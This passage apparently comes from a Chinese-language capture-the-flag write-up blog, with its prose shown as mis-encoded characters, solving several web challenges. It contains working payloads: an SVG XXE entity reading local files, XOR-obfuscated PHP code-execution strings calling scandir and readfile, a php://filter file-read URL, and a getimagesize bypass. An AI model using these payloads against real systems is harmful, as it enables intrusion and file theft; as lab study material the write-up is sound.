class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// check file width/height</span></span><br><span class="line"><span class="string">$size = getimagesize($_FILES[&#x27;</span>file<span class="string">&#x27;][&#x27;</span>tmp_name<span class="string">&#x27;]);</span></span><br><span class="line"><span class="string">if ($size[0] &gt; 256 || $size[1] &gt; 256) &#123;</span></span><br><span class="line"><span class="string">    error(&#x27;</span><span class="title class_">Uploaded</span> image is too large.<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">if ($size[2] !== IMAGETYPE_PNG) &#123;</span></span><br><span class="line"><span class="string">    // I hope this never happens...</span></span><br><span class="line"><span class="string">    error(&#x27;</span><span class="title class_">What</span> happened...? <span class="variable constant_">OK</span>, the flag <span class="keyword">for</span> part <span class="number">1</span> <span class="symbol">is:</span> &lt;code&gt;<span class="string">&#x27; . getenv(&#x27;</span><span class="variable constant_">FLAG1</span><span class="string">&#x27;) . &#x27;</span>&lt;<span class="regexp">/code&gt;&#x27;);</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure>

<p>ç¬¬ä¸€éƒ¨åˆ†é€šè¿‡ finfo_file()æ¥è·å–mineä¿¡æ¯ è¦æ±‚æˆ‘ä»¬ä¸Šä¼ çš„æ˜¯pngå›¾ç‰‡</p>
<p>ç¬¬äºŒéƒ¨åˆ†getimagesize()æ¥è·å–å¤§å°å¹¶ä¸”ä¸åªæ˜¯å¤§å°è¿˜æœ‰å…¶ä»–å›¾ç‰‡ä¿¡æ¯ è¿™ä¸ªå‡½æ•°ä¼šè¿”å›ä¸€ä¸ªåŒ…å«å›¾ç‰‡ä¿¡æ¯çš„æ•°ç»„</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689578104255-28975875-7950-4504-9327-5b15c60952bb.png" alt="img"></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$size</span>[<span class="number">2</span>] !== <span class="variable constant_">IMAGETYPE_PNG</span>) &#123;</span><br><span class="line">    <span class="regexp">//</span> I hope this never happens...</span><br><span class="line">    error(<span class="string">&#x27;What happened...? OK, the flag for part 1 is: &lt;code&gt;&#x27;</span> . getenv(<span class="string">&#x27;FLAG1&#x27;</span>) . <span class="string">&#x27;&lt;/code&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¹¶ä¸”åˆè¦æ±‚getimagesize()è·å–åˆ°å›¾ç‰‡ä¿¡æ¯ä¸­ä¸èƒ½ä¸ºpngå›¾ç‰‡ è¿™æ ·æ‰ä¼šç»™æˆ‘ä»¬flag</p>
<p>æ‰€ä»¥æ€»ç»“ä¸€ä¸‹å°±æ˜¯è¦æ±‚æˆ‘ä»¬ finfo_file()è·å–åˆ°mineä¸ºpngå›¾ç‰‡ ä½†æ˜¯getimagesize()è·å–åˆ°å›¾ç‰‡ä¿¡æ¯åˆä¸èƒ½ä¸ºpngå›¾ç‰‡</p>
<p>æ‰€ä»¥è¿™æ ·å¾ˆæ˜æ˜¾æˆ‘ä»¬éœ€è¦ç»•è¿‡getimagesize()ä¹Ÿå°±æ˜¯è®©<code>$size[2] !== IMAGETYPE_PNG</code>è¿™ä¸ªæ¡ä»¶æˆç«‹</p>
<p>é—®ä¸€ä¸‹gpt</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689578140917-e7bfeac6-bd41-4084-91de-0ac3d3137d68.png" alt="img"></p>
<p>æˆ‘ä»¬å¯ä»¥è®©getimagesize()å‡½æ•°åœ¨è·å–å›¾ç‰‡ä¿¡æ¯çš„æ—¶å€™è®©å…¶å‡ºé”™ ä»è€Œä½¿å¾—è¿™ä¸ªæ¡ä»¶æˆç«‹ æˆåŠŸbypass</p>
<p>éšä¾¿æ‰¾ä¸€ä¸ªç¬¦åˆå…¶ä»–æ¡ä»¶çš„png å›¾ç‰‡</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689578241021-d8677a96-be39-441b-80ea-27bfc18677cb.png" alt="img"></p>
<p>å°†é™¤äº†ç¬¬ä¸€è¡Œä»¥å¤–çš„å…¶ä»–ä¿¡æ¯å…¨éƒ¨åˆ é™¤ç”Ÿæˆä¸€å¼ pngå›¾ç‰‡</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689578269747-e962712b-9a68-4004-adde-9f8db3b60f18.png" alt="img"></p>
<p>è¿™æ ·åªæœ‰æ–‡ä»¶å¤´éƒ¨æ˜¯æ­£å¸¸çš„getimagesize()è·å–ä¸åˆ°å›¾ç‰‡çš„å…¶ä»–ä¿¡æ¯ä»è€Œå‡ºé”™</p>
<p>æˆåŠŸï¼</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689578387080-53ad022c-e65d-4003-887e-d1d92ceab8d4.png" alt="img"></p>
<h1 id="114ã€-BSidesCF-2019-SVGMagic"><a href="#114ã€-BSidesCF-2019-SVGMagic" class="headerlink" title="114ã€[BSidesCF 2019]SVGMagic"></a>114ã€[BSidesCF 2019]SVGMagic</h1><p>SVGæ˜¯Scalable Vector Graphicsçš„ç¼©å†™,æ„ä¸ºå¯ç¼©æ”¾å‘é‡å›¾å½¢ã€‚å®ƒæ˜¯ä¸€ç§ä½¿ç”¨XMLæè¿°2Då›¾å½¢çš„å›¾åƒæ–‡ä»¶æ ¼å¼ã€‚</p>
<p>ä¹Ÿå°±æ˜¯è¯´SVGæ˜¯XMLæ–‡ä»¶  </p>
<p>é‚£ä¹ˆè¯´åˆ°xml ç«‹é©¬å°±èƒ½æƒ³åˆ°xxe å¦‚æœæˆ‘ä»¬åœ¨svgå›¾åƒä¸­æ’å…¥xxeæ¶æ„ä»£ç å‘¢ </p>
<p>ç›´æ¥å·å¸ˆå‚…çš„payloadï¼š</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="string">?x</span>ml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span><span class="string">?&gt;</span></span><br><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> note [</span><br><span class="line">&lt;!<span class="variable constant_">ENTITY</span> file <span class="variable constant_">SYSTEM</span> <span class="string">&quot;file:///proc/self/cwd/flag.txt&quot;</span> &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;svg height=<span class="string">&quot;100&quot;</span> width=<span class="string">&quot;1000&quot;</span>&gt;</span><br><span class="line">  &lt;text x=<span class="string">&quot;10&quot;</span> y=<span class="string">&quot;20&quot;</span>&gt;&amp;file;&lt;<span class="regexp">/text&gt;</span></span><br><span class="line"><span class="regexp">&lt;/svg</span>&gt;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œè¦æ³¨æ„çš„æ˜¯ï¼š</p>
<p>ä¸€èˆ¬æˆ‘ä»¬è¿›è¡Œxxeçš„æ—¶å€™ï¼Œå®šä¹‰äº†å¤–éƒ¨å®ä½“è¿˜è¦é€šè¿‡<code>&amp;</code>æ¥è°ƒç”¨è¿™ä¸ªå®ä½“ï¼Œä½†æ˜¯è¿™é“é¢˜ç›®ä¸éœ€è¦ åªéœ€è¦ä¸Šä¼ ä¸Šå»ä¹‹åä»–ä¼šæ‰§è¡Œ ç„¶åå†æŠŠç»“æœåé¦ˆåˆ°pngå›¾åƒä¸­  å¯èƒ½è¿™å°±æ˜¯renderçš„é­…åŠ›å§:)</p>
<p>è¿™é“é¢˜ç›®flagæ–‡ä»¶ä¸çŸ¥é“åœ¨å“ªé‡Œ</p>
<p><code>/proc/self/cwd</code>è¡¨ç¤ºå½“å‰è·¯å¾„ <code>/proc/self/root</code>è¡¨ç¤ºçš„æ˜¯<code>/</code>æ ¹ç›®å½•</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689579753906-b0e3ebde-2b81-4cb3-a9f0-63176d7ea6fc.png" alt="img"></p>
<h1 id="115ã€-ISITDTU-2019-EasyPHP"><a href="#115ã€-ISITDTU-2019-EasyPHP" class="headerlink" title="115ã€[ISITDTU 2019]EasyPHP"></a>115ã€[ISITDTU 2019]EasyPHP</h1><p>ä¸€é“å¥‡æ·«rceæ„é€ rceçš„é¢˜ç›® å…¶å®å°±æ˜¯å¼‚æˆ–æ„é€ +æ— å‚rce</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="string">?p</span>hp</span><br><span class="line">highlight_file(<span class="variable constant_">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">&#x27;/[\x00- 0-9\&#x27;&quot;`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>, <span class="variable">$_</span>) )</span><br><span class="line">    die(<span class="string">&#x27;rosÃ© will not do it&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( strlen(count_chars(strtolower(<span class="variable">$_</span>), <span class="number">0x3</span>)) &gt; <span class="number">0xd</span> )</span><br><span class="line">    die(<span class="string">&#x27;you are so close, omg&#x27;</span>);</span><br><span class="line"></span><br><span class="line">eval(<span class="variable">$_</span>);</span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ­£åˆ™wafäº†è¿™äº›</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689584978289-6c38ec2a-8a6f-4cf9-bac3-a3d6e45ad99b.png" alt="img"></p>
<p>å†æ¥çœ‹çœ‹è¿™éƒ¨åˆ†ï¼š</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( strlen(count_chars(strtolower(<span class="variable">$_</span>), <span class="number">0x3</span>)) &gt; <span class="number">0xd</span> )</span><br><span class="line">    die(<span class="string">&#x27;you are so close, omg&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>strtolower:å°†æˆ‘ä»¬è¾“å…¥çš„å†…å®¹è½¬ä¸ºå°å†™</p>
<p>count_chars:è¿”å›å­—ç¬¦ä¸²æ‰€ç”¨å­—ç¬¦çš„ä¿¡æ¯</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689585086139-4169ecf7-ab7b-45b8-86fc-f94a956ea8d4.png" alt="img"></p>
<p>è¿™é‡Œæ¨¡å¼ä¸º3æ‰€ä»¥è¿”å›æ‰€æœ‰ä½¿ç”¨äº†çš„å­—èŠ‚å€¼ç»„æˆçš„å­—ç¬¦ä¸²</p>
<p>strlen:è·å–å­—ç¬¦ä¸²é•¿åº¦</p>
<p>æ‰€ä»¥æ•´ä¸ªè¿™ä¸€éƒ¨åˆ†å°±æ˜¯è®¡ç®—æˆ‘ä»¬è¾“å…¥å­—ç¬¦ä¸²å­—ç¬¦ç±»å‹ä¸ªæ•° è·å–æˆ‘ä»¬æ€»å…±è¾“å…¥äº†å‡ ç§å­—ç¬¦</p>
<p>çœ‹äº†è¿™é“é¢˜çš„wp ä¸»è¦æ˜¯å¾ˆéº»çƒ¦ æ ¸å¿ƒå°±æ˜¯é€šè¿‡å¼‚æˆ–æ¥æ„é€ webshell</p>
<p><strong>è¿™é‡Œæœ‰ä¸ªå°tips ä¸€èˆ¬æˆ‘ä»¬æ„é€ å¼‚æˆ–payloadçš„æ—¶å€™éƒ½æ˜¯ä¸</strong><code>%ff</code><strong>å¼‚æˆ–æ¥è·å–å­—ç¬¦çš„</strong></p>
<p>ä¸€ä¸ªç®€å•çš„demoç†è§£å¼‚æˆ–æ„é€ </p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(<span class="variable">@a</span>^<span class="string">&quot;1&quot;</span>);</span><br><span class="line">string(<span class="number">1</span>) <span class="string">&quot;P&quot;</span></span><br><span class="line">php &gt; echo ord(<span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="number">97</span></span><br><span class="line">php &gt; echo ord(<span class="string">&quot;1&quot;</span>);</span><br><span class="line"><span class="number">49</span></span><br><span class="line">php &gt; echo <span class="number">97</span>^<span class="number">49</span>;</span><br><span class="line"><span class="number">80</span></span><br><span class="line">php &gt; echo chr(<span class="number">80</span>);</span><br><span class="line">P</span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆé—®é¢˜æ˜¯97^49ä¸ºä»€ä¹ˆæ˜¯80å‘¢ </p>
<p>å…¶å®æ˜¯åè¿›åˆ¶å…ˆè½¬ä¸ºäºŒè¿›åˆ¶ ç„¶åä¸¤ä¸ªæ•°çš„æ¯ä¸€ä½äºŒè¿›åˆ¶ä¹‹é—´è¿›è¡Œå¼‚æˆ–å¾—åˆ°çš„æ•°å†è½¬ä¸ºåè¿›åˆ¶å°±æ˜¯ç»“æœ</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">01100001</span> <span class="comment">#97äºŒè¿›åˆ¶</span></span><br><span class="line"><span class="number">00110001</span> <span class="comment">#49äºŒè¿›åˆ¶</span></span><br><span class="line"><span class="number">01010000</span> <span class="comment">#æŒ‰ä½å¼‚æˆ–</span></span><br></pre></td></tr></table></figure>

<p>å¯è§è¿™ä¸ªç»“æœå°±æ˜¯åè¿›åˆ¶çš„80</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689585887772-568d3234-ea97-458e-9479-d40477f308b3.png" alt="img"></p>
<p>çœ‹äº†è¿™ç¯‡æ–‡ç« è¿˜æ˜¯å¾ˆä¸é”™çš„<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5677#toc-1">https://xz.aliyun.com/t/5677#toc-1</a></p>
<p>é‡Œé¢è¿˜æœ‰é€šè¿‡é<code>ï¼</code>æ¥è¿›è¡Œæ„é€ æ•°å­—payload çœŸçš„tql</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(@<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(@!<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(@!!<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(@!!<span class="string">&#x27;a&#x27;</span>+@!!<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689586290324-cb408fc9-2f9f-4667-8971-6bec93fef49b.png" alt="img"></p>
<p>æˆåŠŸæ„é€ å‡ºæ•°å­—2</p>
<p>ç„¶åè¿™é“é¢˜ç›®å°±æ˜¯ä¼šé™åˆ¶æˆ‘ä»¬çš„å­—ç¬¦ç±»å‹è¦åœ¨13ä»¥å†… å°±æ˜¯è¦å»æ‰¾åˆ«çš„å­—ç¬¦æ¥å‡å°‘payload è¿™ç‚¹å¾ˆéº»çƒ¦</p>
<p>å…¶æ¬¡å°±æ˜¯æ— å‚rce</p>
<p>æ„é€ <code>print_r(scandir(.))</code>æ¥æ‰¾flagæ–‡ä»¶</p>
<p>paylaod:<code>((%8F%8D%96%91%8B%A0%8D)^(%ff%ff%ff%ff%ff%ff%ff))(((%8C%9C%9E%91%9B%96%8D)^(%ff%ff%ff%ff%ff%ff%ff))(%D1^%ff));</code>ä½†æ˜¯é‡Œé¢çš„å­—ç¬¦ç±»å‹è¶…è¿‡13äº†</p>
<p>åˆ©ç”¨å·²ç»å­˜åœ¨çš„å­—ç¬¦å¼‚æˆ–æ¥æ›¿æ¢å‡å°‘å­—ç¬¦ç±»å‹</p>
<p>æŸ¥æ‰¾å¯ä»¥æ›¿æ¢çš„å­—ç¬¦</p>
<p>a = c^p^r </p>
<p>d = s^c^t </p>
<p>n = i^s^t</p>
<p>æ¯ä¸ªæ›¿æ¢å­—ç¬¦å†ä¸%ffå¼‚æˆ–ä¸€ä¸‹</p>
<p>å¾—åˆ°ï¼š</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689586916100-cb946524-270b-4b18-a5bc-5f0df59a7c1f.png" alt="img"></p>
<p>æœ€åæ„é€ ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((%8f%8d%96%96%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%ff%ff%8c%ff%ff%ff)^(%ff%ff%ff%8b%ff%ff%ff))(((%8c%9c%9c%96%8c%96%8d)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%ff%8f%8c%9c%ff%ff)^(%ff%ff%8d%8b%8b%ff%ff))(%d1^%ff));</span><br></pre></td></tr></table></figure>

<p>å‘ç°flagæ–‡ä»¶</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689586959408-c62cf98f-999c-4bf5-b00a-071047f80595.png" alt="img"></p>
<p>å†æ„é€ ï¼š <code>readfile(end(scandir(.)))</code> æ€è·¯å’Œä¸Šé¢ä¸€æ ·</p>
<p>payload:<code>((%8c%9a%9e%9b%9c%96%93%9a)^(%ff%ff%ff%ff%ff%ff%ff%ff)^(%9b%ff%ff%ff%93%ff%ff%ff)^(%9a%ff%ff%ff%96%ff%ff%ff))(((%9a%9c%9b)^(%ff%ff%ff)^(%ff%93%ff)^(%ff%9e%ff))(((%8c%9c%9e%9c%9b%96%8c)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%ff%ff%93%ff%ff%9b)^(%ff%ff%ff%9e%ff%ff%9a))(%d1^%ff)));</code></p>
<p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://www.shawroot.cc/1209.html">https://www.shawroot.cc/1209.html</a> payloadéƒ½æ˜¯å·çš„è¿™ä¸ªå¤§ä½¬çš„qaq</p>
<h1 id="116ã€-FireshellCTF2020-Caas"><a href="#116ã€-FireshellCTF2020-Caas" class="headerlink" title="116ã€[FireshellCTF2020]Caas"></a>116ã€[FireshellCTF2020]Caas</h1><p>ä¸€ä¸ªcè¯­è¨€æ–‡ä»¶åŒ…å«çš„é¢˜ç›® æ–°å¥‡</p>
<p>ä¸€å¼€å§‹ä»¥ä¸ºæ˜¯phpç¯å¢ƒæˆ–è€…python ç„¶åæœç´¢æŠ¥é”™ä¿¡æ¯ä¹‹åè¿”ç°æ˜¯cè¯­è¨€</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689589242051-f7b75cce-acff-450e-b3d1-cb3da4fe2d1c.png" alt="img"></p>
<p>payload:<code>#include &quot;/flag&quot;</code></p>
<h1 id="117ã€-N1CTF-2018-eating-cms"><a href="#117ã€-N1CTF-2018-eating-cms" class="headerlink" title="117ã€[N1CTF 2018]eating_cms"></a>117ã€[N1CTF 2018]eating_cms</h1><p>è€ƒç‚¹ï¼šparse_urlè§£ææ¼æ´</p>
<p>é¦–å…ˆåœ¨<code>/register.php</code>ä¸‹ç”³è¯·ä¸€ä¸ªè´¦å· è€å¥—è·¯äº† ç„¶åç™»å½•</p>
<p>ç„¶åçœ‹äº†ä¸‹è¯·æ±‚çš„ç½‘å€ å¾ˆåƒä»»æ„æ–‡ä»¶è¯»å–url</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/user.php?page=php://filter/read=convert.base64-encode/resource=info</span><br></pre></td></tr></table></figure>

<p>ç”¨ä¼ªåè®®è¯»ä¸€ä¸‹ å¾—åˆ°ä»¥ä¸‹å†…å®¹</p>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;function.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] ))&#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Location: user.php?page=info&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;templates/index.html&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>user.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">require_once</span>(<span class="string">&quot;function.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>( !<span class="keyword">isset</span>( <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] ))&#123;</span><br><span class="line">  <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;isadmin&#x27;</span>] === <span class="string">&#x27;1&#x27;</span>)&#123;</span><br><span class="line">  <span class="variable">$oper_you_can_do</span> = <span class="variable">$OPERATE_admin</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="variable">$oper_you_can_do</span> = <span class="variable">$OPERATE</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//die($_SESSION[&#x27;isadmin&#x27;]);</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;isadmin&#x27;</span>] === <span class="string">&#x27;1&#x27;</span>)&#123;</span><br><span class="line">  <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]) || <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>] === <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])|| <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>] === <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$page</span> === <span class="string">&#x27;info&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">//            echo(&quot;&lt;script&gt;alert(&#x27;no premission to visit info, only admin can, you are guest&#x27;)&lt;/script&gt;&quot;);</span></span><br><span class="line">      <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Location: user.php?page=guest&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">filter_directory</span>();</span><br><span class="line"><span class="comment">//if(!in_array($page,$oper_you_can_do))&#123;</span></span><br><span class="line"><span class="comment">//    $page = &#x27;info&#x27;;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;<span class="subst">$page</span>.php&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>info.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (FLAG_SIG != <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;you can not visit it directly &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;templates/info.html&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>function.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span 